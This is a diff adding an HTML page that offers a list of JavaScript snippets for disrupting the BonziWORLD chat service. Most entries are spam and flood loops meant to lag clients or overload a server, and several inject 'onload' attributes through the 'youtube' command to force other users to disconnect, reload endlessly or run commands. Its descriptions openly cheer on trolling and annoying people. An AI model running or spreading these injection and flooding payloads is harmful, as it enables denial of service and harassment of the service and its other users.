@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>BonziWORLDJSDT - Scripts</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+body {
+  font-family: Arial, Helvetica, sans-serif;
+  background-color: black;
+}
+
+.mobile-container {
+  max-width: 480px;
+  margin: auto;
+  background-color:#004400;
+  height: 2500px;
+  color: lime;
+  border-radius: 10px;
+}
+
+.topnav {
+  overflow: hidden;
+  background-color: aqua;
+  position: relative;
+}
+
+.topnav #myLinks {
+  display: none;
+}
+
+.topnav a {
+  color: red;
+  padding: 14px 16px;
+  text-decoration: none;
+  font-size: 17px;
+  display: block;
+}
+
+.topnav a.icon {
+  background: darkred;
+  display: block;
+  position: absolute;
+  right: 0;
+  top: 0;
+}
+
+.topnav a:hover {
+  background-color: darkgreen;
+  color: lime;
+}
+
+.active {
+  background-color: green;
+  color: mediumforestgreen;
+}
+</style>
+</head>
+<body>
+
+<!-- Simulate a smartphone / tablet -->
+<div class="mobile-container">
+
+<!-- Top Navigation Menu -->
+<div class="topnav">
+  <a href="#home" class="active"><strike><mark><em><strong>BonziWORLDJSDT</strong></em></mark></strike></a>
+  <div id="myLinks">
+    <a href="index.html">Home</a>
+    <a href="scripts.html">Scripts</a>
+    <a href="pts.html">Powerful tool scripts</a>
+    <a href="about.html">About</a>
+  </div>
+  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
+    <i class="fa fa-bars"></i>
+  </a>
+</div>
+
+<div style="padding-left:16px">
+  <h3>BonziWORLD Scripts list:</h3>
+  <p>More lag, aw snapping, more. But, it totally will, make javascript by yourself!</p>
+  <hr>
+  <p><b>Color spam (Recommended):</b></p>
+  <p><font size="1"><em>Be rainbow bonzi and you cannot talk. This color spamming makes to lag you (leak memory usage).</em></font></p>
+  <p><code>javascript:setInterval(function() { socket.emit("command", {list: ["color"]}) }, 1);</code></p>
+  <p><b>Behh spam (Recommended):</b></p>
+  <p><font size="1"><em>Spams and repeats same text. People can actually dislike little bit for you.</em></font></p>
+  <p><code>javascript:function rnd() { return Math.floor( (Math.random() * 1) % (125 - 15) + 15); };var pitch = setInterval(function() { socket.emit("command", {list: ["pitch", rnd() + '']}) }, 200);var message = "behh ";var spamessage = message.repeat(500 / message.length);var spam = setInterval(function() { socket.emit("talk", {text: spamessage} ); },150);</code></p>
+  <p><b>Disconnect bot:</b></p>
+  <p><font size="1"><em>Disconnects automatically by using socket.disconnect();, if muted or never loaded, that person won't leave.</em></font></p>
+  <p><code>javascript:setInterval(function() { socket.emit('command',{list:['youtube',`" onload="socket.disconnect();" ass="`]}) }, 1000);</code></p>
+  <p><b>Shimmer:</b></p>
+  <p><font size="1"><em>Shimmer, it's a name. idk if the name has been glitched.</em></font></p>
+  <p><code>javascript:setInterval(function() { socket.emit("command", {list: ["name",'Shimmer']}) }, 1000);setInterval(function() { socket.emit("command", {list: ["name",'Shine']}) }, 1010);setInterval(function() { socket.emit("command", {list: ["name",'Leah']}) }, 1020);setInterval(function() { socket.emit("command", {list: ["name",'Shimmie']}) }, 1030);</code></p>
+  <p><b>Name (number) spam:</b></p>
+  <p><font size="1"><em>Lag on names, asshole his numbers.</em></font></p>
+  <p><code>var e = 0; setInterval(function(){e++;socket.emit('command',{list:['name',''+e]})},1000)</code></p>
+  <p><b>Flood script <font color="aquamarine">(EXPERIMENTAL)</font>:</b></p>
+  <p><font size="1"><em>Floods and leaks a server, but remember, you will get banned for flooding. Enter the domain name or ip, type name/room, and then, type message here to flood in. Empty room here.</em></font></p>
+  <p><code>javascript:setInterval(function(){var Doe = io('http://[ip]');
+Doe.emit('login',{name:'Username',room:'Room'});
+Doe.emit('talk',{text:'Message Text'})},1000);</code></p>
+  <p><b>Text repeating spam:</b></p>
+  <p><font size="1"><em>Same message makes automatically sending. And, people making mad when its spamming.</em></font></p>
+  <p><code>javascript:setInterval(function() { socket.emit("talk", {text: 'willie and twinkle'} ); },150);</code></p>
+  <p><b>Force reload page:</b></p>
+  <p><font size="1"><em>People cannot reload this page, no problems with the page, user tries to reload all people be refreshed. Also, it's called <q><font color="red">Tr</font><font color="orangered">ol</font><font color="orange">li</font><font color="yellow">ng</font></q>.</em></font></p>
+  <p><code>javascript:setInterval(function() { socket.emit('command',{list:['youtube',`" onload="window.location.reload();" ass="`]}) }, 1000);</code></p>
+  <p><b>Force a backflip:</b></p>
+  <p><font size="1"><em>Force announce backflipping.</em></font></p>
+  <p><code>javascript:socket.emit('command',{list:['youtube','eee" onload="socket.emit(\'command\',{list:[\'backflip\']})"']})</code></p>
+  <p><b>Force a joke:</b></p>
+  <p><font size="1"><em>Nobody tells a joke, you stupid!</em></font></p>
+  <p><code>javascript:socket.emit('command',{list:['youtube','eee" onload="socket.emit(\'command\',{list:[\'joke\']})"']})</code></p>
+  <p><b>Force change speed and pitch to 0:</b></p>
+  <p><font size="1"><em>They speak are too fastly, if user loads to all people, changes his speed/pitch.</em></font></p>
+  <p><code>javascript:socket.emit('command',{list:['youtube','eee" onload="socket.emit(\'command\',{list:[\'speed\',\'0\']}), socket.emit(\'command\',{list:[\'pitch\',\'0\']})"']})</code></p>
+<hr>
+<p>If you want to join Seamus server, go to <a href="https://discord.gg/VGGMhB5">Discord</a></p>
+</div>
+
+<!-- End smartphone / tablet look -->
+</div>
+
+<script>
+function myFunction() {
+  var x = document.getElementById("myLinks");
+  if (x.style.display === "block") {
+    x.style.display = "none";
+  } else {
+    x.style.display = "block";
+  }
+}
+</script>
+
+</body>
+</html>
